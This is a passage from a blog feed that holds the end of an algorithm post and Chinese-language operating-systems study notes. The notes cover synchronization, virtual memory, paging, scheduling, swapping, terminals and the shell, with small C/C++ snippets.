k)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span> (k == <span class="hljs-number">1</span>)<br>    &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-type">int</span> tmp = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = Max; i * k &lt; rest; i++)<br>    &#123;<br>        tmp += <span class="hljs-built_in">dfs</span>(rest - i, i, k - <span class="hljs-number">1</span>);<br>    &#125;<br>    <span class="hljs-keyword">return</span> tmp;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    cin &gt;&gt; n &gt;&gt; k;<br>    cout &lt;&lt; <span class="hljs-built_in">dfs</span>(n, <span class="hljs-number">1</span>, k);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    ios::<span class="hljs-built_in">sync_with_stdio</span>(<span class="hljs-literal">false</span>);<br>    cin.<span class="hljs-built_in">tie</span>(<span class="hljs-literal">NULL</span>);<br>    cout.<span class="hljs-built_in">tie</span>(<span class="hljs-literal">NULL</span>);<br>    <span class="hljs-built_in">Main</span>();<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>算法</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>OS</title>
    <link href="/2021/07/17/OS%E7%AC%94%E8%AE%B0/"/>
    <url>/2021/07/17/OS%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<h3 id="Concurrency"><a href="#Concurrency" class="headerlink" title="Concurrency"></a>Concurrency</h3><p>并发部分一开始没有记笔记，后续会慢慢补上。sry、、</p><p>硬件和软件之间的桥梁：</p><p>​    硬件和软件之间有一个最小的约定,CPU reset之后。会到固件去执行。固件会把磁盘的第一个512字节，加载到内存的一个特定位置，这时候代码就已经获得了计算机的控制权。</p><p>​    操作系统进行内存分配的两个系统调用，brk和mmp。</p><p>​    堆区的末尾就是brk，sbrk通过改变指针来改变堆区的大小，来改变分配内存的大小。</p><p>​    mmap可以返回地址空间里的一段内存。</p><p>​    glibc中，一般大内存分配采用mmap直接分配，小内存分配通常采用brk&amp;sbrk。^_^ </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c++">古代方法<br> <span class="hljs-function"><span class="hljs-type">void</span> *<span class="hljs-title">sbrk</span><span class="hljs-params">(<span class="hljs-type">intptr_t</span> increment)</span></span>;<br>现代方法<br>    <span class="hljs-function"><span class="hljs-type">void</span> *<span class="hljs-title">mmap</span><span class="hljs-params">(<span class="hljs-type">void</span> *addr,<span class="hljs-comment">//建议的分配位置，可为NULL</span></span></span><br><span class="hljs-params"><span class="hljs-function">               <span class="hljs-type">size_t</span> length,<span class="hljs-comment">//大小</span></span></span><br><span class="hljs-params"><span class="hljs-function">               <span class="hljs-type">int</span> port,<span class="hljs-comment">//访问权限 PROT_READ / PROT_WRITE</span></span></span><br><span class="hljs-params"><span class="hljs-function">               <span class="hljs-type">int</span> flags <span class="hljs-comment">//MAP_ANONYMOUS,匿名映射 = 内存分配</span></span></span><br><span class="hljs-params"><span class="hljs-function">               <span class="hljs-type">int</span> fd,<span class="hljs-comment">//不涉及任何文件描述符；-1</span></span></span><br><span class="hljs-params"><span class="hljs-function">               <span class="hljs-type">off_t</span> offset)</span></span>;<span class="hljs-comment">// 0</span><br>)<br></code></pre></td></tr></table></figure><h4 id="Conditional-Variables（条件变量，CV）"><a href="#Conditional-Variables（条件变量，CV）" class="headerlink" title="Conditional Variables（条件变量，CV）"></a>Conditional Variables（条件变量，CV）</h4><p>同步的本质：当某个条件满足时，线程执行，否则等待。</p><p>可以用一个对象来表示条件的满足/不满足！</p><p>条件不满足：随时可以在这个对象上<strong>等待</strong>。</p><p>条件满足：另一个线程发现条件满足，<strong>唤醒</strong>一个（所有）正在等待的线程。</p><h4 id="CV-API"><a href="#CV-API" class="headerlink" title="CV API"></a>CV API</h4><p><strong>wait</strong>:线程发现条件不满足，需要进入睡眠状态，等待CV上事件的发生。</p><p><strong>signal/notify</strong>:报告CV上事件的发生，如果有线程正在等待CV，则唤醒其中一个线程。</p><p><strong>broadca/notifyALL</strong>:因为有可能有多个事件在等待这个条件变量上事件的发生，报告CV上事件的发生，唤醒全部正在等待CV的线程。</p><h4 id="条件变量和互斥锁联合使用"><a href="#条件变量和互斥锁联合使用" class="headerlink" title="条件变量和互斥锁联合使用"></a>条件变量和互斥锁联合使用</h4><p>在条件变量wait之前，获得一把互斥锁，条件不满足的时候执行wait，释放锁。如果其他线程对执行wait的线程进行signal（唤醒）的话，那么这个线程会试图获取这把互斥锁，才能接着往下执行代码，最后释放锁。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-built_in">mute_lock</span>(&amp;mutex);<br>.....     <span class="hljs-comment">//其他代码</span><br><span class="hljs-built_in">wait</span>(&amp;CV,&amp;mutex);<br>.....     <span class="hljs-comment">//任意代码，包括循环</span><br><span class="hljs-built_in">mute_unlock</span>(&amp;mutex);<br><span class="hljs-comment">//signal不受互斥锁的约束</span><br></code></pre></td></tr></table></figure><h4 id="Semaphore-信号量"><a href="#Semaphore-信号量" class="headerlink" title="Semaphore(信号量)"></a>Semaphore(信号量)</h4><p>互斥锁的概念：可以把互斥锁理解为游泳池的一个手环，由泳池管理员进行分配，游泳人员想要进入泳池必须从管理员那拿到这个手环。游完泳出来之后再把手环还给管理员。</p><p>也可以给管理员多个手环，比如前四个到来的都可以从管理员那得到手环进入泳池，第五个人就必须等待。信号量就是在这个基础上做了一个更有意思的改变。就是让进入泳池的人随时变出一个手环，可以看作是为token（令牌），得到token的就可以执行，得不到就得等待。这个手环就是信号量。</p><p>信号量有两个操作。P操作可以理解为：去admin那询问有没有手环，如果有就可以进入泳池。V操作可以理解为，任何一个同学不论是在泳池还是在其他地方，都可以把手环还给admin。</p><p>以上：就是信号量和PV操作。想要获得资源就要进行P操作，想要释放资源就要进行V操作。</p><p>同时，信号量 = 互斥锁和CV的结合体</p><p>~互斥锁：</p><p>​    仅有一个手环的情况下，P = lock ， V= unlock</p><p>~条件变量：</p><p>​    手环的数量作为等待的条件</p><p>P = wait  V =  signal</p><h3 id="Virtualization"><a href="#Virtualization" class="headerlink" title="Virtualization"></a>Virtualization</h3><p>应用只能通过系统调用和OS进行交互，除此之外应用就只能做它自己的程序代码所描述的事情。</p><p>所以在应用视角，OS就是一组系统调用API。而在硬件视角，就是一个状态机，一个C程序。</p><p>OS也是一个应用程序，那么OS是如何支撑这么多应用程序的运行呢？</p><p>它做的一件事其实是状态机的模拟。OS状态机的内存和寄存器和应用程序的内存和寄存器有一些不同，OS的状态机可以看到完整的物理内存，其次有一些应用程序无法访问的系统寄存器。OS所做的事情就是用OS的内存和寄存器去模拟应用程序的状态机。</p><p>OS所做的一件事情实际是就是所谓的虚拟化，虚拟化的就是为每一个程序提供一个虚拟的执行环境。</p><p>OS“模拟”了其中所有进程的状态机，这就是“虚拟化”，程序仿佛独占CPU运行，但其实独占的只是CPU的一部分（还有其他部分看不见）。通过把CPU分成用户执行进程的模式和操作系统执行进程的模式就实现了程序的虚拟化。CPU有两种运行的模式，即：用户态（User mode）和内核态(kernel mode)。应用程序始终在用户态上运行，OS始终在内核态上运行。操作系统希望执行哪个应用程序的时候，就会把自己切换到那个应用程序的状态机和用户态上执行。发生系统调用或者中断，就会从用户态切换到内核态。</p><p>OS也可以理解为一个中断处理程序，通过中断完成内核态和用户态的切换。</p><p>状态机的管理：创建状态机</p><p>fork：做的就是一份状态机完整的复制（内存，寄存器现场，堆栈等），fork创建出来的进程叫做子进程，执行fork的进程叫做父进程。fork（）返回创建出来的进程的PID，子进程返回0。</p><p>状态机的管理：替换状态机</p><p>execve:  某个状态机有一天会执行execve，在此之前，会把filename,argv,enpv，这三个参数准备好，执行execve这个系统调用，发生的事情就是，这个程序从filename开始执行，给filename这个程序传递main</p><p>函数，传递argv，和envp。也就是说execve好像执行的是状态机的reset,把某个程序复位为开始执行的状态。 </p><p>PATH环境变量：就是可执行文件的搜索路径。</p><p>状态机的管理：终止状态机</p><p>exit: 销毁一个状态机，并拥有一个返回值。但有一个问题是，状态机里可能有多个线程…</p><p>结束程序执行的三种方法：1：exit(0) - stdlib.h中声明的libc函数，会调用atexit</p><p>2：_exit(0) - glibic的syscall wrapper，执行 “exit_group”系统调用终止整个进程（所有线程），不会调用atexit，Linux中可以用strace查看。</p><p>3：syscall(SYS_exit,0)，执行”exit”系统调用终止当前线程，同时，也不会调用atexit。</p><p>主要，要区分好库函数（应用程序的一部分）和系统调用就好啦。</p><h4 id="操作系统中的进程"><a href="#操作系统中的进程" class="headerlink" title="操作系统中的进程"></a>操作系统中的进程</h4><p>​    如何实现一个操作系统？</p><h5 id="物理内存管理"><a href="#物理内存管理" class="headerlink" title="物理内存管理"></a>物理内存管理</h5><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c++">只分配不回收的...<br><span class="hljs-function"><span class="hljs-type">void</span> *<span class="hljs-title">kalloc</span><span class="hljs-params">(<span class="hljs-type">size_t</span> size)</span></span>&#123;<br>    <span class="hljs-type">static</span> <span class="hljs-type">uintptr_t</span> brk = <span class="hljs-number">0</span>;<br>    brk = brk  ? <span class="hljs-comment">//如果是第一次调用，进入？的另一个分支， </span><br>        <span class="hljs-built_in">ROUNDUP</span>(brk,size) + size:<span class="hljs-comment">//不是第一次调用进入的分支，把brk置为下一个内存分配的起始点。 </span><br>    (<span class="hljs-type">uintptr_t</span>)_heap.start + size; <span class="hljs-comment">//第一次调用进入的分支</span><br>    <span class="hljs-keyword">return</span> (<span class="hljs-type">void</span>*)(brk - size)<br> &#125;<br><span class="hljs-type">void</span> <span class="hljs-built_in">kfree</span>(<span class="hljs-type">void</span> *ptr) &#123; &#125;<br></code></pre></td></tr></table></figure><h5 id="内核多线程"><a href="#内核多线程" class="headerlink" title="内核多线程"></a>内核多线程</h5><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">union</span> <span class="hljs-title class_">task</span>&#123;<br>    <span class="hljs-keyword">struct</span>&#123; <br>    _Context *conteext;<br>    _AddressSpace vm;<br>        <span class="hljs-type">char</span> *page,*cmd;<br>    &#125;;<span class="hljs-comment">//匿名结构体</span><br>    <span class="hljs-type">uint8_t</span> stack[<span class="hljs-number">8192</span>];<br>&#125;Task;<br>Task tasks[] = &#123; ... &#125;,**current;<br><span class="hljs-meta">#<span class="hljs-keyword">define</span> current currents[_cpu]</span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">intptr_t</span> <span class="hljs-type">lock_t</span>;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">spin_lock</span><span class="hljs-params">(<span class="hljs-type">lock_t</span> *lk)</span></span>&#123; _intr_write(<span class="hljs-number">0</span>); <span class="hljs-keyword">while</span> (_atomic_xchg(lk,<span class="hljs-number">1</span>)); &#125;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">spin_unlock</span><span class="hljs-params">(<span class="hljs-type">lock_t</span> *lk)</span></span>&#123; _atomic_xchg(lk,<span class="hljs-number">0</span>)); _intr_write(<span class="hljs-number">1</span>); &#125;<br><span class="hljs-function">_Context *<span class="hljs-title">schedule</span><span class="hljs-params">(_Context *ctx)</span> </span>&#123; <br><span class="hljs-keyword">if</span>(!current) current = &amp;tasks[<span class="hljs-number">0</span>];     <span class="hljs-comment">//current代表系统中当前运行的线程。</span><br>    <span class="hljs-keyword">else</span> current-&gt;context = ctx;           <span class="hljs-comment">//记录寄存器现场，以及保存上下文。</span><br>    <span class="hljs-keyword">do</span> &#123; <br>        <span class="hljs-keyword">if</span>(++current = tasks + <span class="hljs-built_in">LENGTH</span>(tasks)) <br>            current = &amp;tasks[<span class="hljs-number">0</span>];<br>    &#125;<span class="hljs-keyword">while</span>((current - tasks) % _ncpu() != _cpu());<span class="hljs-comment">// 线程的编号 模 所有处理器的数量等于当前处理器编号的时候，才会将这个线程调度到这个处理器上执行。</span><br>    <span class="hljs-keyword">return</span> current-&gt;context;               <span class="hljs-comment">//把当前处理器现场恢复到处理器上 </span><br>&#125; <span class="hljs-comment">//在中断的驱动下，做上下文的切换，把CPU进行了虚拟化。</span><br></code></pre></td></tr></table></figure><h5 id="文件系统"><a href="#文件系统" class="headerlink" title="文件系统"></a>文件系统</h5><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c++">.............<br></code></pre></td></tr></table></figure><h5 id="进程和系统调用"><a href="#进程和系统调用" class="headerlink" title="进程和系统调用"></a>进程和系统调用</h5><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">//每一个进程都有自己的虚拟空间，而这个虚拟空间是寄存器CR3l控制的 ，在中断处理程序的时候，在 T1进程iret之前，把T2进程的CR3放到CPU上就完成了进程的切换。 </span><br></code></pre></td></tr></table></figure><h4 id="进程抽象：Linux进程的地址空间"><a href="#进程抽象：Linux进程的地址空间" class="headerlink" title="进程抽象：Linux进程的地址空间"></a>进程抽象：Linux进程的地址空间</h4><hr><p>进程执行指令需要代码，数据，堆栈。。。</p><p>​    代码：（main,%rip 会从此处取出待执行的指令）</p><p>​    数据：（static int x）</p><p>​    堆栈：（int y）</p><p>他们都可以用<strong>指针</strong>访问</p><p>​    动态链接库</p><p>​    运行时分配的内存。 </p><hr><p>  进程的地址空间 = 内存里若干个连续的“ 段 ”</p><p>​    每一段是可访问（读/写/执行）的内存</p><p>​        可能映射到某个文件和/或在进程间共享</p><p>管理进程地址空间的系统调用</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">void</span> *<span class="hljs-title">mmap</span><span class="hljs-params">(<span class="hljs-type">void</span> *addr,<span class="hljs-type">size_t</span> length,<span class="hljs-type">int</span> prot,<span class="hljs-type">int</span> flags,<span class="hljs-type">int</span> fd,<span class="hljs-type">off_t</span> offset)</span></span>;<span class="hljs-comment">//分配  </span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">munmap</span><span class="hljs-params">(<span class="hljs-type">void</span> *addr,<span class="hljs-type">size_t</span> length)</span></span>;<span class="hljs-comment">//回收</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">mprotect</span><span class="hljs-params">(<span class="hljs-type">void</span> *addr,<span class="hljs-type">size_t</span> length,<span class="hljs-type">int</span> prot)</span>；<span class="hljs-comment">//修改内存的权限</span></span><br></code></pre></td></tr></table></figure><p>mmap也可以把文件映射到进程地址空间。 </p><p>进程状态中的内存其实是由一段一段内存映射的区域构成的，这个区域可以用mmap这样的系统调用来进行修改。</p><p>查看进程的地址空间：pmap </p><hr><p>Virtual system call : <strong>只读</strong>的系统调用也许可以不陷入内核执行。</p><h4 id="Virtual-system-call-：-实现"><a href="#Virtual-system-call-：-实现" class="headerlink" title="Virtual system call ： 实现"></a>Virtual system call ： 实现</h4><p>vvar：内核和进程共享的数据</p><p>vdso(virtual dynamic shared object)：系统调用代码实现（是操作系统的一部分）</p><p>vsyscall：是普通系统调用的包装</p><p>小tips：访问进程的地址空间，劫持进程的控制流，就是游戏外挂的本质！、</p><p>操作系统也是一个状态机，但是OS看见的内存是物理内存。</p><p>那么如何用一块物理内存模拟（Virtualize）一个进程的虚拟空间呢？</p><p>我们需要一个函数 f : [0,M) —&gt;  [0,M)</p><p>把“虚拟地址”翻译成“物理地址”，毕竟我们的内存只有一份，f由操作系统控制（应用程序不可见）：可以把f“装载”到CPU上，此后任何指令访问地址x（包括取指令），都访问实际的物理地址f(x)，任何越权访问将会触发异常。</p><p>​    那么问题又来了，如何高效的在硬件上实现f（） ？</p><p>​    f（）有一些要求：支持f（）在运行时的动态修改（mmap,munmap）；非常节约：f（）的存储开销必须远小于实际使用的内存；非常高效：因为每次访问都要计算f(x)。</p><p>​    <strong>分页机制</strong>：不必维护 [0,M) —&gt;  [0,M)的映射，而是把地址空间切成大小是P的“页面”。只维护[0,M / P ) —&gt;  [0,M / P)，的映射。需要一个内存中的数据结构来描述这样的映射，这种数据结构就是<strong>字典树</strong>。假设一个32bit的地址空间，我们要构造一个两层字典树，第一层为PD（Page Directory,页目录），第二层为PT(Page Table,页表)，其次就是一个真正的页面。将32位分成10-10-12。第一个10bit查找PD，第二个10bit查找PT，最后来找到其相应的页面。以上，本质上就是用一个字典树来维护虚拟地址到物理地址的翻译。</p><p>X86-64是一个四层的字典树(其实只用了48bit)从上到下依次是（PLM4  PDPT  PD  PT）。</p><p>mmap实现非常快，因为实际上它只维护了一张表，比如[7f1881238 - 1fcbaas2133]这段地址空间映射到一个文件。mmap就结束了，他没有给这个进程分配任何一个地址空间。只需要“让OS知道这么映射就够了”，进程访问页面会发生缺页，进入操作系统。缺页时，操作系统会得到缺页的地址。  结合之前说的，进程的地址空间是由一段一段构成的，操作系统没有必要在这一段创建的时候立刻分配内存，而是OS可以等到进程访问这个页面的时候，产生了page fault以和再分配，是一种lazy的分配。如果访问页面合法，分配一页：其中，匿名内存-》直接返回；文件-》执行read，把文件数据读到内存。如果访问非法，发送信号（SIGSEGV）,就是我们看见的segmentation fault。</p><h4 id="处理器调度"><a href="#处理器调度" class="headerlink" title="处理器调度"></a>处理器调度</h4><h5 id="Round-Robin"><a href="#Round-Robin" class="headerlink" title="Round-Robin"></a>Round-Robin</h5><p>​    假设当前Ti运行，中断后试图切换到下一个进T(i + 1) mod n  ，如果下一个进程正在等待I/O返回，继续执行下一个，如果系统所有的进程都不需要CPU，就调度idel进程（<del>专门用来等待的空循环,因为CPU每时每刻都必须执行指令。</del>）执行。</p><h5 id="引入优先级"><a href="#引入优先级" class="headerlink" title="引入优先级"></a>引入优先级</h5><p>Unix niceness, nice value (-20,-19,18……18,19),value值越小，越会占用CPU。value值相差10，CPU获得相差10倍..</p><p><del>好人流下了悔恨的泪水</del>。</p><h5 id="多级反馈调度（MLFQ）"><a href="#多级反馈调度（MLFQ）" class="headerlink" title="多级反馈调度（MLFQ）"></a>多级反馈调度（MLFQ）</h5><p>设置若干个Round-Robin队列，每个队列对应一个优先级，调度策略是优先调度高优先级队列  Q8 Q7 Q6 Q5 …. 可以在进程运行的时候对进程的实际行为进行观测，可以动态的调整进程的优先级。 </p><h5 id="Complete-Fair-Scheduling-CFS"><a href="#Complete-Fair-Scheduling-CFS" class="headerlink" title="Complete Fair Scheduling(CFS)"></a>Complete Fair Scheduling(<strong>CFS</strong>)</h5><p>Linux正在服役的调度策略。可以在中断发生时，观看每个进程过去的运行时间，理想情况下每个进程的运行时间应该是相同的，每次中断发生时，会补偿获得CPU上运行时间最少的进程。 会维护一个vruntime（virtual run time 虚拟运行时间），选择vruntime少的进程执行。</p><p>其中有一些复杂的情况，子进程会继承父进程的vruntime。</p><p>另外一种情况，假设有一个进程睡眠了很长时间，它的vruntime非常小，会不断占用CPU，那么其他的进程就会产生饥饿， Linux解决的办法就是让唤醒之后的进程获得系统中最小的vruntime。</p><p>vruntime的使用：因为记录的是虚拟运行时间，假设一个高优先级的进程实际运行了10S的物理时间，但是系统系统会记录1S的虚拟运行时间，高优先级的进程时间过得比较慢，这样可以得到更多的CPU来执行。低优先级的相反，进程的运行时间过的比较快。</p><p>vruntime的实现：<del>红黑树</del>。</p><h5 id="优先级反转问题"><a href="#优先级反转问题" class="headerlink" title="优先级反转问题"></a>优先级反转问题</h5><p>优先级最高（nice value最小，为-20） bad guy (-20)  该进程也想获得和very nice guy一样的互斥锁，但是因为该锁还没有释放，所以需要等待。</p><p>优先级其次（5）nice guy(5)：此时该进程就获得了比bad guy更高的优先级，此时就发生了反转。</p><p>优先级最低（19）very nice guy(19) 假设这个进程先执行，首先该进程得到了一把互斥锁，在还没有释放之前 中断来临。</p><p><strong>解决办法</strong>：优先级继承/优先级提升，就是说低优先级的任务和高优先级的任务共享了同一把互斥锁，当高优先级的任务想获得这把互斥锁的时候，那么持有这把互斥锁的任务，都立即继承这个最高的优先级。 </p><h4 id="实现mmap：借助分页机制"><a href="#实现mmap：借助分页机制" class="headerlink" title="实现mmap：借助分页机制"></a>实现mmap：借助分页机制</h4><p>mmap的神奇之处：几乎总在瞬间完成，比如用mmap申请8GiB的内存空间，或者用mmap映射整个磁盘。 </p><p>实际上为mmap做映射和分配物理内存这两件事情是可以分开的 。所以，可以事先把分配的内存标记起来，不能读不能写也不能执行。</p><p>等到实际内存访问发生的时候，访问就会发生一个错误，希望OS能够捕捉这样一个错误，也就是缺页（page fault），OS可以根据这个缺页的地址， 来找到是哪个页面缺页了。这个页面是不是真的属于这个进程，如果真的属于这个进程，再lazy的把这个页面分配给这个进程。 </p><p>硬件其实提供了一个机制叫做分页，那么分页是什么呢？</p><p>​    其实，系统里有一个寄存器叫做CR3(是CPU的一部分)，可以给CR3填一个数值， 这个数值可以指向物理内存中的一个页面，可以把物理内存中的页面解读成一个数据结构，也就是解读成一个函数f，这个函数f就可以把进程地址空间的任何一个页面映射到物理内存中的某个页面，有一些页面会映射为空。同时我们可以在系统中对CR3执行mov指令，把CR3指向物理内存中 另外一个页面，就可以把新指向的页面解读成另外一个函数f，那么又可以将另外一个虚拟地址空间映射到物理内存中。靠着修改CR3寄存器的值，这样就实现了在地址空间中切换。</p><p>​    CR3寄存器其实是不分你我的，不管是用户进程的代码还是操作系统的代码都共享同一个函数f,所以在实现操作系统时要做的，就是把操作系统的代码和进程的代码都映射到同一个地址空间里。   进程中有一部分段时高权限可以访问，低权限不能访问的区域。 如果用户程序的指针去访问的话会直接segmentation fault，但是操作系统在中断之后是有权限访问的，操作系统就会很聪明的把进程的高权限访问区域都映射到同一份的操作系统内核的代码和数据。</p><p>​    demand paging：进程一开始并不需要获得它所持有的页面，而是只要当需要的时候才把这个页面给这个进程。</p><h4 id="Swqpping"><a href="#Swqpping" class="headerlink" title="Swqpping"></a>Swqpping</h4><p>当系统的内存不够时，可以把某个进程暂停，并且可以把它的任意一个页面取出来，放到磁盘上。</p><h5 id="Swqpping：策略"><a href="#Swqpping：策略" class="headerlink" title="Swqpping：策略"></a>Swqpping：策略</h5><p>Everything is about <em>prediction</em></p><ul><li>最优策略（Belady’s Algorithm）</li></ul><p>​            swap out 未来最后使用的页面（<del>如果能预测未来的话</del>）</p><ul><li>实际上：我们只要能近似准确的预测未来 <ul><li> 内存不足时把未来大概率不用的页面swap out</li><li>提前把可能使用的页面换入（prefetch）</li><li>page fault 时 swap in (进程才能继续执行)</li></ul></li></ul><h5 id="一些不太好的策略"><a href="#一些不太好的策略" class="headerlink" title="一些不太好的策略"></a>一些不太好的策略</h5><p><strong>FIFO：First-in First-out</strong></p><ul><li>明显不太好–有一些“hot”的页面（code/data）显然不应该被swap out</li></ul><p> <strong>Random</strong></p><ul><li>明显不太好–不小心把重要的页面换出去了</li></ul><p><strong>LRU(最近最少用)</strong></p><ul><li>但不好实现 :joy:<ul><li>注意“LRU”需要知道我们怎么“use”内存的</li><li>“use”内存的方式是一条load/store指令</li></ul></li></ul><hr><h4 id="终端：操作系统里的一个对象"><a href="#终端：操作系统里的一个对象" class="headerlink" title="终端：操作系统里的一个对象"></a>终端：操作系统里的一个对象</h4><p>终端是一个I/O设备，是一个可以读写的对象。</p><ul><li>“Everything is a file”–终端也是一个文件</li></ul><h5 id="向终端输出：支持一系列的ANSI-Escape-Codes"><a href="#向终端输出：支持一系列的ANSI-Escape-Codes" class="headerlink" title="向终端输出：支持一系列的ANSI Escape Codes"></a>向终端输出：支持一系列的ANSI Escape Codes</h5><ul><li>Start with ESC(\033)[</li><li>光标移动；屏幕清除/滚动；设置前景/背景色/粗体….</li><li>例子：ls –color | less，可以看到很多ESC</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">define</span> ESC  <span class="hljs-string">&quot;\O33[&quot;</span></span><br><span class="hljs-meta">#difine move(x,y) put(ESC <span class="hljs-string">&quot;%D;%Dh&quot;</span>,y + 1,x + 1)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> setbg(c)  put(ESC <span class="hljs-string">&quot;48;5;%dm&quot;</span>,c)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> setfg(c)  put(ESC <span class="hljs-string">&quot;38;5;%dm&quot;</span>,c)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> clear()   put(ESC <span class="hljs-string">&quot;2J&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> reset()  put(ESC <span class="hljs-string">&quot;39m&quot;</span> ESC <span class="hljs-string">&quot;49m&quot;</span>)</span><br></code></pre></td></tr></table></figure><p>因此如果打印二进制文件，”偶然“的escape code可能改变终端的行为</p><ul><li>reset(1) //复位终端</li></ul><h5 id="从终端输入"><a href="#从终端输入" class="headerlink" title="从终端输入"></a>从终端输入</h5><p>终端默认是”cooked(canonical) mode“，即自带一个”行编辑器“。</p><ul><li>vim用户: set -o vi(bash); bindkey -v (zsh)</li><li>只有按下回车键，read系统调用才返回</li></ul><hr><p>另一个是”raw mode“，按键即返回。</p><ul><li>有了它，就能实现vim啦！</li><li>有了它，给read设置一个timeout，就能在没有按键的前提下更新屏幕啦！</li></ul><p>一系列终端”密码“ </p><h5 id="操作系统还需要一个人机接口（Interface）"><a href="#操作系统还需要一个人机接口（Interface）" class="headerlink" title="操作系统还需要一个人机接口（Interface）"></a>操作系统还需要一个人机接口（Interface）</h5><p>需要一个程序管理人机 的交互</p><ul><li>这个程序就是操作系统的外壳（shell）</li></ul><p>操作系统的的内核（kernel）我们是没有办法直接使用的，必须加一个外壳，就是shell。shell通过OS的API和OS进行交互，shell是真正和用户对接的接口。</p><p>可以接收用户指令，启动/ 管理应用程序。</p><h5 id="UNIX-Shell"><a href="#UNIX-Shell" class="headerlink" title="UNIX Shell"></a>UNIX Shell</h5><p>​    Shell也是一个编程语言，就是为了管理系统当中的进程，文件以及各种各样的对象而诞生的编程语言，Shell实际上也是一个编程语言的解释器，解释执行这些命令。</p><ul><li><strong>interactive shell</strong>：（没有参数）收到一行，执行一行。</li><li><strong>non-interactive shell</strong>：就是普通的语言解释器。</li></ul><p>Shell是“人机接口”的含义：<strong>interactive shell</strong> <strong>是把用户给I/O设备的指令翻译成系统调用的应用程序</strong></p><ul><li>是<strong>用户眼中的操作系统</strong>（I/O设备）和<strong>应用程序眼中的操作系统</strong>（系统调用）的桥梁<ul><li>完整流程：用户 ⇨ I/O设备 ⇨ shell/应用程序 ⇨ 系统调用</li></ul></li></ul><h5 id="什么是文件描述符"><a href="#什么是文件描述符" class="headerlink" title="什么是文件描述符"></a>什么是文件描述符</h5><p>​    Shell需要从终端读取输入，向终端输出。终端是什么？</p><ul><li>终端是操作系统里的一个对象。</li></ul><p>​    文件描述符是进程用来访问操作系统对象的“指针” 。进程想要访问操作系统中的对象是不能直接访问的，因为进程有自己的地址空间，进程只能读写自己地址空间中的内存，操作系统虽然也映射了，但是进程不能访问，访问就会发生segmentation fault。所以如果进程想要访问操作系统中的对象就必须通过系统调用来完成，在设计系统调用的时候就会想到设计一个参数，能够允许进程指定希望读/写操作系统中的哪一个对象，这样的机制就是用文件描述符实现的。</p><p>​    可以理解为文件描述符就是进程中另外一个地址空间， 这个地址空间里的每一个就是指向操作系统对象的一个指针。</p><hr><p>任何操作系统都需要这样的机制</p><ul><li>Windows : 句柄（<del>迷惑的翻译行为</del>）<ul><li>其实英文是很形象的（把手）</li></ul></li></ul><p>UNIX认为，一个进程应该不会持有太多的操作系统对象</p><ul><li>用一个小整数就OK了<ul><li>0，1，2分别是stdin，std out，stderr</li><li>open会返回最小的未使用的整数、</li></ul></li></ul><h5 id="信号（Signal）机制"><a href="#信号（Signal）机制" class="headerlink" 